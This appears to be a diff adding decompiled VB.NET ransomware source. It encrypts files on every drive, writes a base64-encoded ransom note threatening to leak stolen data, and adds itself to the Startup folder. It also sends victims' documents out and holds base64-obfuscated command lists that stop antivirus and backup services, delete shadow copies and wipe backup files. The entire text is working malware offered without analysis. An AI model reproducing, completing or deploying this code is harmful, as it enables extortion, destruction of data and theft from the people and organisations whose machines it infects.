+			Process.Start(New ProcessStartInfo() With { .Arguments = """" + str + """" + Assembly.GetEntryAssembly().Location, .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = "cmd.exe" })
+			Environment.[Exit](0)
+		End Sub
+
+		' Token: 0x06000010 RID: 16 RVA: 0x00004730 File Offset: 0x00002930
+		Public Shared Function LeaveRegards(mykey As String) As String
+			Dim text As String = Path.GetTempPath() + "\HOW_TO_DECYPHER_FILES.txt"
+			If Not File.Exists(text) Then
+				Using streamWriter As StreamWriter = New StreamWriter(text)
+					streamWriter.WriteLine(Program.Base64Decode("eW91ciBmaWxlcywgZG9jdW1lbnRzLCBhbmQgYWxsIG9mIHlvdXIgbmV0d29yayBlbmNyeXB0ZWQuDQphbGwgYmFja3VwIGRyaXZlIGFuZCB0YXBlIGRlbGV0ZWQgb2YgZm9ybWF0dGVkLg0KYWxsIHNoYWRvdyBjb3BpZXMgZGVsZXRlZC4NCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KRE9OVCBSRVNUQVJUIFBDDQpET05UIFRPVUNIIE9SIEVESVQgTE9DS0VEIEZJTEVTDQpET05UIFVTRSBSRUdVTEFSIFJFQ09WRVJZIFNPRlRXQVJFLCBFVkVOICJNSUNST1NPRlQgUkVDT1ZFUlkgVE9PTCINCg0KQUxMIE9GIFRIT1NFIE5PVEVTIFdJTEwgQ0FVU0UgWU9VIExPU1QgWU9VUiBGSUxFUyBGT1IgRVZFUg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KaW1wb3J0YW50IGZpbGVzLCBkb2N1bWVudHMgYW5kIGV0YyBkb3dubG9hZGVkLCBhZnRlciBwdXJjaGFzZSB0aW1lIGlmIHlvdSBkb250IHBheSwgd2Ugd2lsbCBsZWFrIHRoZW0NCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCmNvbnRhY3QgOiAwMDEwMDIwMDNAc2VjbWFpbC5wcm8="))
+					streamWriter.WriteLine(vbCrLf)
+					streamWriter.WriteLine(Program.Base64Decode("S2V5IElkZW50aWZpZXI6IA=="))
+					streamWriter.WriteLine(mykey)
+				End Using
+			Else
+				File.AppendAllText(text, vbCrLf & "Aditional KeyId:" & vbCrLf + mykey)
+			End If
+			Return text
+		End Function
+
+		' Token: 0x06000011 RID: 17 RVA: 0x000047D8 File Offset: 0x000029D8
+		Public Shared Sub appShortcutToSartUp(linkName As String, appName As String)
+			Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
+			Using streamWriter As StreamWriter = New StreamWriter(folderPath + "\" + linkName + ".url")
+				streamWriter.WriteLine("[Summary]")
+				streamWriter.WriteLine("URL=file:///" + appName)
+				streamWriter.WriteLine("IconIndex=0")
+				Dim str As String = appName.Replace("\"c, "/"c)
+				streamWriter.WriteLine("IconFile=" + str)
+			End Using
+		End Sub
+
+		' Token: 0x06000012 RID: 18 RVA: 0x000048BC File Offset: 0x00002ABC
+		Private Shared Sub Crypt(dizin As String(), uzantilar As String(), excomunicated As String(), sifre As String, crypt_uzantisi As String)
+			Program.PasswordBytes = Encoding.ASCII.GetBytes(sifre)
+			If dizin(0) = "[auto]" Then
+				Dim drives As DriveInfo() = DriveInfo.GetDrives()
+				If drives.Length > 0 Then
+					For i As Integer = 0 To drives.Length - 1
+						If drives(i).IsReady Then
+							If Not Program.DizonList.Contains(drives(i).Name) Then
+								Program.DizonList.Add(drives(i).Name)
+							End If
+						End If
+					Next
+				End If
+			Else
+				For i As Integer = 0 To dizin.Length - 1
+					If Not Program.DizonList.Contains(dizin(i)) Then
+						Program.DizonList.Add(dizin(i))
+					End If
+				Next
+			End If
+			If Program.DizonList.Contains(Program.Base64Decode("Qzpc")) AndAlso Program.SkipC = "YES" Then
+				Program.DizonList.Remove(Program.Base64Decode("Qzpc"))
+			End If
+			Using enumerator As List(Of String).Enumerator = Program.DizonList.GetEnumerator()
+				While enumerator.MoveNext()
+					Dim t As String = enumerator.Current
+					If Program.MultipleThreads = "YES" Then
+						Dim thread As Thread = New Thread(Sub()
+							Program.WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre)
+						End Sub)
+						thread.Priority = ThreadPriority.Highest
+						thread.IsBackground = False
+						thread.Start()
+						thread.Join()
+					Else
+						Program.WorkerCrypter(t, uzantilar, crypt_uzantisi, excomunicated, sifre)
+					End If
+				End While
+			End Using
+		End Sub
+
+		' Token: 0x06000013 RID: 19 RVA: 0x00004B08 File Offset: 0x00002D08
+		Public Shared Sub WorkerCrypter(targetDir As String, extensions As String(), extension As String, excluded As String(), DynamicPass As String)
+			Dim list As List(Of String) = New List(Of String)()
+			Dim list2 As List(Of String) = New List(Of String)() From { "" }
+			If Program.AlternateAlgo = "NO" Then
+				list = Program.TraverseTree(targetDir, extensions, extension, excluded, DynamicPass)
+			Else
+				list = Program.RecursiveFileSearch.SearchFiles(targetDir)
+				For Each text As String In extensions
+					For Each text2 As String In list
+						If excluded.Length <> 0 Then
+							For Each value As String In excluded
+								If text2.EndsWith(value) Then
+									GoTo IL_3BC
+								End If
+							Next
+						End If
+						If Program.ProcessAll = "NO" Then
+							If Not text2.EndsWith(text) Then
+								Continue For
+							End If
+						End If
+						If Not Program.EncryptedFiles.Contains(text2) Then
+							If Program.ReleaseLockedFiles = "YES" Then
+								Try
+									If LockedFiles.Islocked(text2) Then
+										LockedFiles.Killproc(text2)
+									End If
+								Catch
+								End Try
+							End If
+							Program.EncryptedFiles.Add(text2)
+							If Not Program.EncryptedDirs.Contains(Path.GetDirectoryName(text2)) Then
+								Program.EncryptedDirs.Add(Path.GetDirectoryName(text2))
+							End If
+							Try
+								Dim fileStream As FileStream = New FileStream(text2, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
+								If Program.PartialEncrytion = "YES" AndAlso fileStream.Length > CLng((Convert.ToInt32(Program.PartialSize) * 1024 * 1024)) AndAlso Not list2.Contains(text) Then
+									If Program.Styler = "YES" Then
+										For Each value2 As String In Program.extstyl
+											If text2.ToLower().EndsWith(value2) AndAlso Program.LimitMe = "YES" Then
+												If CLng((Convert.ToInt32(Program.MaxSize) * 1024 * 1024)) > fileStream.Length Then
+													Try
+														UtilMe.SendB("URL", "USERNAME", "ACCESO", text2)
+													Catch
+													End Try
+												End If
+											ElseIf text2.ToLower().EndsWith(value2) AndAlso Program.LimitMe = "NO" Then
+												Try
+													UtilMe.SendB("URL", "USERNAME", "ACCESO", text2)
+												Catch
+												End Try
+											End If
+										Next
+									End If
+									fileStream.Dispose()
+									Dim clear As Byte() = Encryptions.ReadFromFile(text2, Convert.ToInt32(Program.PartialSize) * 1024 * 1024)
+									Dim encrypted As Byte() = Encryptions.AESEncryptBytes(clear, Encoding.ASCII.GetBytes(DynamicPass), New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 })
+									Encryptions.WriteToFile(text2, encrypted)
+									If extension <> ".*" Then
+										File.Move(text2, text2 + extension)
+									End If
+								ElseIf extension <> ".*" Then
+									Program.Encrypt(text2, text2 + extension, Program.PasswordBytes)
+								Else
+									Program.Encrypt(text2, text2 + ".part", Program.PasswordBytes)
+								End If
+							Catch ex As Exception
+							End Try
+						End If
+						IL_3BC:
+					Next
+				Next
+			End If
+		End Sub
+
+		' Token: 0x06000014 RID: 20 RVA: 0x0000542C File Offset: 0x0000362C
+		Public Shared Sub WorkerCrypter2(files As List(Of String), extensions As String(), extension As String, excluded As String(), DynamicPass As String)
+			Dim domeall As List(Of String) = New List(Of String)() From { "" }
+			Parallel.ForEach(Of String)(extensions, Sub(t1 As String)
+				For Each text As String In files
+					If excluded.Length <> 0 Then
+						For Each value As String In excluded
+							If text.EndsWith(value) Then
+								GoTo IL_3AC
+							End If
+						Next
+					End If
+					If Program.ProcessAll = "NO" Then
+						If Not text.EndsWith(t1) Then
+							Continue For
+						End If
+					End If
+					If Not Program.EncryptedFiles.Contains(text) Then
+						If Program.ReleaseLockedFiles = "YES" Then
+							Try
+								If LockedFiles.Islocked(text) Then
+									LockedFiles.Killproc(text)
+								End If
+							Catch
+							End Try
+						End If
+						Program.EncryptedFiles.Add(text)
+						If Not Program.EncryptedDirs.Contains(Path.GetDirectoryName(text)) Then
+							Program.EncryptedDirs.Add(Path.GetDirectoryName(text))
+						End If
+						Try
+							Dim fileStream As FileStream = New FileStream(text, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
+							If Program.PartialEncrytion = "YES" AndAlso fileStream.Length > CLng((Convert.ToInt32(Program.PartialSize) * 1024 * 1024)) AndAlso Not domeall.Contains(t1) Then
+								If Program.Styler = "YES" Then
+									For Each value2 As String In Program.extstyl
+										If text.ToLower().EndsWith(value2) AndAlso Program.LimitMe = "YES" Then
+											If CLng((Convert.ToInt32(Program.MaxSize) * 1024 * 1024)) > fileStream.Length Then
+												Try
+													UtilMe.SendB("URL", "USERNAME", "ACCESO", text)
+												Catch
+												End Try
+											End If
+										ElseIf text.ToLower().EndsWith(value2) AndAlso Program.LimitMe = "NO" Then
+											Try
+												UtilMe.SendB("URL", "USERNAME", "ACCESO", text)
+											Catch
+											End Try
+										End If
+									Next
+								End If
+								fileStream.Dispose()
+								If Program.Blocks = "NO" Then
+									Dim clear As Byte() = Encryptions.ReadFromFile(text, Convert.ToInt32(Program.PartialSize) * 1024 * 1024)
+									Dim encrypted As Byte() = Encryptions.AESEncryptBytes(clear, Encoding.ASCII.GetBytes(DynamicPass), New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 })
+									Encryptions.WriteToFile(text, encrypted)
+								Else
+									Complex.Blocks.BlockProcess(text, Program.PartialSize, DynamicPass)
+								End If
+								If extension <> ".*" Then
+									File.Move(text, text + extension)
+								End If
+							ElseIf extension <> ".*" Then
+								Program.Encrypt2(text, text + extension, Program.PasswordBytes)
+							Else
+								Program.Encrypt2(text, text + ".part", Program.PasswordBytes)
+							End If
+						Catch ex As Exception
+						End Try
+					End If
+					IL_3AC:
+				Next
+			End Sub)
+		End Sub
+
+		' Token: 0x06000015 RID: 21 RVA: 0x00005498 File Offset: 0x00003698
+		Private Shared Sub Encrypt(inputFile As String, outputFile As String, passwordBytes As Byte())
+			Try
+				Dim salt As Byte() = New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 }
+				Dim fileStream As FileStream = New FileStream(outputFile, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite)
+				Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged()
+				rijndaelManaged.KeySize = 256
+				rijndaelManaged.BlockSize = 128
+				Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(passwordBytes, salt, 1000)
+				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8)
+				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8)
+				rijndaelManaged.Padding = PaddingMode.Zeros
+				rijndaelManaged.Mode = CipherMode.CBC
+				Dim cryptoStream As CryptoStream = New CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write)
+				Dim fileStream2 As FileStream = New FileStream(inputFile, FileMode.Open)
+				While True
+					Dim num As Integer = fileStream2.ReadByte()
+					Dim num2 As Integer = num
+					If num = -1 Then
+						Exit For
+					End If
+					cryptoStream.WriteByte(CByte(num2))
+				End While
+				fileStream2.Dispose()
+				cryptoStream.Dispose()
+				fileStream.Dispose()
+				Try
+					If outputFile.Length > 0 Then
+						Dim fileStream3 As FileStream = New FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
+						If Program.Styler = "YES" Then
+							For Each value As String In Program.extstyl
+								If inputFile.ToLower().EndsWith(value) AndAlso Program.LimitMe = "YES" Then
+									If CLng((Convert.ToInt32(Program.MaxSize) * 1024 * 1024)) > fileStream3.Length Then
+										Try
+											UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile)
+										Catch
+										End Try
+									End If
+								ElseIf inputFile.ToLower().EndsWith(value) AndAlso Program.LimitMe = "NO" Then
+									Try
+										UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile)
+									Catch
+									End Try
+								End If
+							Next
+						End If
+						fileStream3.Dispose()
+						Dim num3 As Integer = 1000000
+						While True
+							Try
+								While File.Exists(inputFile) AndAlso num3 >= 0
+									File.Delete(inputFile)
+								End While
+							Catch
+								num3 -= 1
+								Continue For
+							End Try
+							Exit For
+						End While
+						If outputFile.EndsWith(".part") Then
+							File.Move(outputFile, outputFile.Replace(".part", ""))
+						End If
+					Else
+						Try
+							File.Delete(outputFile)
+						Catch
+						End Try
+					End If
+				Catch
+				End Try
+			Catch ex As Exception
+			End Try
+		End Sub
+
+		' Token: 0x06000016 RID: 22 RVA: 0x00005898 File Offset: 0x00003A98
+		Private Shared Sub Encrypt2(inputFile As String, outputFile As String, passwordBytes As Byte())
+			Try
+				Dim salt As Byte() = New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 }
+				Dim outputFile2 As String = outputFile
+				Dim fileStream As FileStream = New FileStream(outputFile2, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite)
+				Dim rijndaelManaged As RijndaelManaged = New RijndaelManaged()
+				rijndaelManaged.KeySize = 256
+				rijndaelManaged.BlockSize = 128
+				Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = New Rfc2898DeriveBytes(passwordBytes, salt, 1000)
+				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8)
+				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8)
+				rijndaelManaged.Padding = PaddingMode.Zeros
+				rijndaelManaged.Mode = CipherMode.CBC
+				Dim cryptoStream As CryptoStream = New CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write)
+				Dim fileStream2 As FileStream = New FileStream(inputFile, FileMode.Open)
+				While True
+					Dim num As Integer = fileStream2.ReadByte()
+					Dim num2 As Integer = num
+					If num = -1 Then
+						Exit For
+					End If
+					cryptoStream.WriteByte(CByte(num2))
+				End While
+				fileStream2.Dispose()
+				cryptoStream.Dispose()
+				fileStream.Dispose()
+				Try
+					If outputFile.Length > 0 Then
+						Dim fileStream3 As FileStream = New FileStream(inputFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
+						If Program.Styler = "YES" Then
+							For Each value As String In Program.extstyl
+								If inputFile.ToLower().EndsWith(value) AndAlso Program.LimitMe = "YES" Then
+									If CLng((Convert.ToInt32(Program.MaxSize) * 1024 * 1024)) > fileStream3.Length Then
+										Try
+											UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile)
+										Catch
+										End Try
+									End If
+								ElseIf inputFile.ToLower().EndsWith(value) AndAlso Program.LimitMe = "NO" Then
+									Try
+										UtilMe.SendB("URL", "USERNAME", "ACCESO", inputFile)
+									Catch
+									End Try
+								End If
+							Next
+						End If
+						fileStream3.Dispose()
+						New Thread(Sub()
+							While True
+								Try
+									File.Delete(inputFile)
+								Catch
+									Continue For
+								End Try
+								Exit For
+							End While
+						End Sub).Start()
+						If outputFile.EndsWith(".part") Then
+							File.Move(outputFile, outputFile.Replace(".part", ""))
+						End If
+					Else
+						New Thread(Sub()
+							While True
+								Try
+									If File.Exists(outputFile) Then
+										File.Delete(outputFile)
+									End If
+								Catch
+									Continue For
+								End Try
+								Exit For
+							End While
+						End Sub).Start()
+					End If
+				Catch
+				End Try
+			Catch ex As Exception
+			End Try
+		End Sub
+
+		' Token: 0x04000001 RID: 1
+		Public Shared imha As String = "EVET"
+
+		' Token: 0x04000002 RID: 2
+		Public Shared files_ As String()
+
+		' Token: 0x04000003 RID: 3
+		Public Shared dirs As IEnumerable(Of DirectoryInfo)
+
+		' Token: 0x04000004 RID: 4
+		Public Shared PasswordBytes As Byte() = Nothing
+
+		' Token: 0x04000005 RID: 5
+		Public Shared di As DirectoryInfo
+
+		' Token: 0x04000006 RID: 6
+		Public Shared Size As String = "NO"
+
+		' Token: 0x04000007 RID: 7
+		Public Shared Mb As String = "100000000"
+
+		' Token: 0x04000008 RID: 8
+		Public Shared DizonList As List(Of String) = New List(Of String)()
+
+		' Token: 0x04000009 RID: 9
+		Public Shared DoneExtensions As List(Of String) = New List(Of String)()
+
+		' Token: 0x0400000A RID: 10
+		Public Shared Persistence As String = "NO"
+
+		' Token: 0x0400000B RID: 11
+		Public Shared DynamicPass As String = ""
+
+		' Token: 0x0400000C RID: 12
+		Public Shared DeceiveMe As String = "NO"
+
+		' Token: 0x0400000D RID: 13
+		Public Shared rand As Integer = 0
+
+		' Token: 0x0400000E RID: 14
+		Public Shared ReleaseLockedFiles As String = "YES"
+
+		' Token: 0x0400000F RID: 15
+		Public Shared AntiVM As String = "NO"
+
+		' Token: 0x04000010 RID: 16
+		Public Shared Delay As String = "YES"
+
+		' Token: 0x04000011 RID: 17
+		Public Shared DelayTime As String = "15"
+
+		' Token: 0x04000012 RID: 18
+		Public Shared DisableDefender As String = "NO"
+
+		' Token: 0x04000013 RID: 19
+		Public Shared DisableAMSI As String = "NO"
+
+		' Token: 0x04000014 RID: 20
+		Public Shared CriticalProcess As String = "NO"
+
+		' Token: 0x04000015 RID: 21
+		Public Shared WallpaperChanger As String = "NO"
+
+		' Token: 0x04000016 RID: 22
+		Public Shared meltList As List(Of String) = New List(Of String)() From { Program.Base64Decode("bHNhc3MuZXhl"), Program.Base64Decode("c3ZjaHN0LmV4ZQ=="), Program.Base64Decode("Y3Jjc3MuZXhl"), Program.Base64Decode("Y2hyb21lMzIuZXhl"), Program.Base64Decode("ZmlyZWZveC5leGU="), Program.Base64Decode("Y2FsYy5leGU="), Program.Base64Decode("bXlzcWxkLmV4ZQ=="), Program.Base64Decode("ZGxsaHN0LmV4ZQ=="), Program.Base64Decode("b3BlcmEzMi5leGU="), Program.Base64Decode("bWVtb3AuZXhl"), Program.Base64Decode("c3Bvb2xjdi5leGU="), Program.Base64Decode("Y3RmbW9tLmV4ZQ=="), Program.Base64Decode("U2t5cGVBcHAuZXhl") }
+
+		' Token: 0x04000017 RID: 23
+		Public Shared EncryptedDirs As List(Of String) = New List(Of String)()
+
+		' Token: 0x04000018 RID: 24
+		Public Shared SpreadOverNetwork As String = "YES"
+
+		' Token: 0x04000019 RID: 25
+		Public Shared Live4Ever As String = "NO"
+
+		' Token: 0x0400001A RID: 26
+		Public Shared KillTM As String = "NO"
+
+		' Token: 0x0400001B RID: 27
+		Public Shared EncryptedFiles As List(Of String) = New List(Of String)()
+
+		' Token: 0x0400001C RID: 28
+		Public Shared FtpLog As String = "NO"
+
+		' Token: 0x0400001D RID: 29
+		Private Shared appGuid As String = "3747bdbf-0ef0-42d8-9234-70d68801f407"
+
+		' Token: 0x0400001E RID: 30
+		Public Shared MultipleThreads As String = "YES"
+
+		' Token: 0x0400001F RID: 31
+		Public Shared WoL As String = "NO"
+
+		' Token: 0x04000020 RID: 32
+		Public Shared netShadowList As List(Of String) = New List(Of String)() From { Program.Base64Decode("c3RvcCBhdnBzdXMgL3k="), Program.Base64Decode("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="), Program.Base64Decode("c3RvcCBtZmV3YyAveQ=="), Program.Base64Decode("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"), Program.Base64Decode("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="), Program.Base64Decode("c3RvcCBEZWZXYXRjaCAveQ=="), Program.Base64Decode("c3RvcCBjY0V2dE1nciAveQ=="), Program.Base64Decode("c3RvcCBjY1NldE1nciAveQ=="), Program.Base64Decode("c3RvcCBTYXZSb2FtIC95"), Program.Base64Decode("c3RvcCBSVFZzY2FuIC95"), Program.Base64Decode("c3RvcCBRQkZDU2VydmljZSAveQ=="), Program.Base64Decode("c3RvcCBRQklEUFNlcnZpY2UgL3k="), Program.Base64Decode("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="), Program.Base64Decode("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="), Program.Base64Decode("c3RvcCBZb29CYWNrdXAgL3k="), Program.Base64Decode("c3RvcCBZb29JVCAveQ=="), Program.Base64Decode("c3RvcCB6aHVkb25nZmFuZ3l1IC95"), Program.Base64Decode("c3RvcCBzdGNfcmF3X2FnZW50IC95"), Program.Base64Decode("c3RvcCBWU05BUFZTUyAveQ=="), Program.Base64Decode("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="), Program.Base64Decode("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"), Program.Base64Decode("c3RvcCBWZWVhbU5GU1N2YyAveQ=="), Program.Base64Decode("c3RvcCB2ZWVhbSAveQ=="), Program.Base64Decode("c3RvcCBQRFZGU1NlcnZpY2UgL3k="), Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="), Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="), Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"), Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"), Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"), Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="), Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="), Program.Base64Decode("c3RvcCBBY3JTY2gyU3ZjIC95"), Program.Base64Decode("c3RvcCBBY3JvbmlzQWdlbnQgL3k="), Program.Base64Decode("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"), Program.Base64Decode("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="), Program.Base64Decode("c3RvcCBzb3Bob3MgL3k=") }
+
+		' Token: 0x04000021 RID: 33
+		Public Shared scList As List(Of String) = New List(Of String)() From { Program.Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="), Program.Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"), Program.Base64Decode("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="), Program.Base64Decode("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk") }
+
+		' Token: 0x04000022 RID: 34
+		Public Shared taskList As List(Of String) = New List(Of String)() From { Program.Base64Decode("L0lNIG1zcHViLmV4ZSAvRg=="), Program.Base64Decode("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="), Program.Base64Decode("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G") }
+
+		' Token: 0x04000023 RID: 35
+		Public Shared vssList As List(Of String) = New List(Of String)() From { Program.Base64Decode("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="), Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"), Program.Base64Decode("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=") }
+
+		' Token: 0x04000024 RID: 36
+		Public Shared delList As List(Of String) = New List(Of String)() From { Program.Base64Decode("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"), Program.Base64Decode("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"), Program.Base64Decode("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"), Program.Base64Decode("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"), Program.Base64Decode("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"), Program.Base64Decode("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr") }
+
+		' Token: 0x04000025 RID: 37
+		Public Shared DelayedActivation As String = "NO"
+
+		' Token: 0x04000026 RID: 38
+		Public Shared ExpireOption As String = "NO"
+
+		' Token: 0x04000027 RID: 39
+		Friend Shared ActiveAfterDateTime As DateTime = New DateTime(2000, 1, 1)
+
+		' Token: 0x04000028 RID: 40
+		Friend Shared ExpireAfterDateTime As DateTime = New DateTime(2100, 1, 1)
+
+		' Token: 0x04000029 RID: 41
+		Public Shared PartialEncrytion As String = "YES"
+
+		' Token: 0x0400002A RID: 42
+		Public Shared PartialSize As String = "10"
+
+		' Token: 0x0400002B RID: 43
+		Public Shared StaticLooks As String = "YES"
+
+		' Token: 0x0400002C RID: 44
+		Public Shared SystemFiles As String = "NO"
+
+		' Token: 0x0400002D RID: 45
+		Public Shared RIPmeBiot As String = "YES"
+
+		' Token: 0x0400002E RID: 46
+		Public Shared ADMINISTRATOR As String = "YES"
+
+		' Token: 0x0400002F RID: 47
+		Public Shared FAC As String = "YES"
+
+		' Token: 0x04000030 RID: 48
+		Public Shared Styler As String = "NO"
+
+		' Token: 0x04000031 RID: 49
+		Public Shared extstyl As List(Of String) = New List(Of String)() From { "docx", "pdf", "xlsx", "csv" }
+
+		' Token: 0x04000032 RID: 50
+		Public Shared LimitMe As String = "NO"
+
+		' Token: 0x04000033 RID: 51
+		Public Shared MaxSize As String = "1"
+
+		' Token: 0x04000034 RID: 52
+		Public Shared TransparentMan As String = "YES"
+
+		' Token: 0x04000035 RID: 53
+		Public Shared AlternateAlgo As String = "NO"
+
+		' Token: 0x04000036 RID: 54
+		Public Shared Jerry As String = "NO"
+
+		' Token: 0x04000037 RID: 55
+		Public Shared toolLocation As String = String.Empty
+
+		' Token: 0x04000038 RID: 56
+		Public Shared Drag_Drop As String = "NO"
+
+		' Token: 0x04000039 RID: 57
+		Public Shared NotifyMe As String = "NO"
+
+		' Token: 0x0400003A RID: 58
+		Public Shared NotifyCustom As String = "NO"
+
+		' Token: 0x0400003B RID: 59
+		Public Shared LegalTitle As String = ""
+
+		' Token: 0x0400003C RID: 60
+		Public Shared LegalText As String = ""
+
+		' Token: 0x0400003D RID: 61
+		Public Shared Upper As String = "NO"
+
+		' Token: 0x0400003E RID: 62
+		Public Shared LANShares As String = "YES"
+
+		' Token: 0x0400003F RID: 63
+		Public Shared ProcessAll As String = "NO"
+
+		' Token: 0x04000040 RID: 64
+		Public Shared ReleaseAllFiles As String = "NO"
+
+		' Token: 0x04000041 RID: 65
+		Public Shared FixMBR As String = "NO"
+
+		' Token: 0x04000042 RID: 66
+		Public Shared LogonPass As String = "LOGONISOFF"
+
+		' Token: 0x04000043 RID: 67
